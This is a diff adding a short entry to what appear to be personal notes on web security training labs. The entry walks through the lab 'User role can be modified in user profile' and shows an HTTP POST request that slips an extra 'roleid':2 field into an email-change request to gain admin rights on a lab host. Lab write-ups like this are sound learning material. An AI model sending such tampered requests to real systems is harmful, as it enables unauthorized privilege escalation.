@@ -86,7 +86,16 @@ then i manipulate it and set to true. now i can access to the admin panel and de
 
 #### Lab: User role can be modified in user profile
 
+login as the given credit. and in change-update section their we can modify the data of our own, so:
 
+```
+POST /my-account/change-email HTTP/2
+Host: 0a7500580392221783a1562900c000cd.web-security-academy.net
+Cookie: session=iPQ0ErMwPRiw62sGSCu6PFR3KuBnPyDi
+
+{"email":"test@gmail.com",
+"roleid":2}
+```
 
 
 
